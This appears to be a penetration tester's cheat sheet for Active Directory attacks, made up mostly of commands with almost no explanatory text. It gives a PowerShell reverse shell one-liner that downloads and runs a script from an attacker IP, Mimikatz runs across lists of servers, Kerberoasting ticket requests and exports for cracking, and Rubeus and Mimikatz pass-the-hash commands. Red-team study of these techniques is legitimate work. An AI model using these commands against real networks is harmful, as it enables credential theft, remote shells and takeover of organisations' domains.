# AD - Lateral Movement / Connections

## **Basics**

**PowerShell Remoting**

* Its like psexec on steroids
* Enabled by default on Server 2012 and newer
* May need to enable remoting Enable-PSRemoting (admin privs required) e.g Win10
* You get an elevated shell if admin creds are use - so a lot of UAC Issues are not relevant
* Port 5985/5986 (SSL Encrypted) - is used (based on WinRM)
* One-To-One or One-To-Many (non-interactive, executes parallely)&#x20;
* Credentials are not left on target unless CredSSP/Unconstraned Delegation?
* Runs in process "wsmprovhost" and is stateful

## **Connections / PowerShellRemoting**

**Access C disk of a computer (check local admin)**\
ls \\\\\[hostname]\c$

**Connect to machine with administrator privs**\
****Enter-PSSession -Computername

**Save and use sessions of a machine**\
****$sess = New-PSSession -Computername hostname.local\
Enter-PSSession $sess

**Execute commands on a machine (non-interactive)**\
Invoke-Command -Scriptblock {whoami} -Computername (Get-Content \<list-of-servers-file>) \
Invoke-Command -Computername hostname -Scriptblock {whoami;hostname}

**Execute script on a machine**\
****Invoke-Command -Computername (Get-Content \<list-of-servers-file>) -FilePath  C:\scripty\a.ps1\
Invoke-Command -FilePath $sess

&#x20; **Execute locally loaded function on a list of remote machines**\
Invoke-Command -Scriptblock ${function:} -Computername (Get-Content \<list\_of\_servers>)\
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content \<list\_of\_servers>)

**Copy script to other server**\
****Copy-Item .\Invoke-MimikatzEx.ps1 \\\hostname\c$\\'Program Files'

**Powershell reverse shell**\
powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000\
****

```
```

## **Kerberoasting**

### **Description**

### **Attack commands**

**See existing tickets**\
klist

**Remove all tickets**\
****klist purge

**Request a kerberos service ticket for a specific SPN - output Hashcat format**\
****Powerview - **** Request-SPNTicket -SPN "name/target.domain.local" \[-OutputFormat JTR]

**Manually**\
Add-Type -AssemblyName System.IdentityModel\
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "name/target.domain.local"

**Dump the ticket**\
Invoke-Mimikatz -Command '"kerberos::list /export"'

\=> Now Crack\


## Over-Pass the Hash <a href="#over-pass-the-hash" id="over-pass-the-hash"></a>

### Description



### Attack commands

Rubeus.exe asktgt /user:USER < /rc4:HASH | /aes128:HASH | /aes256:HASH> \[/domain:DOMAIN] \[/opsec] /ptt

sekurlsa::pth /user:Administrator /domain:target.domain.local < /ntlm:hash | /aes256:hash> /run:powershell.exe



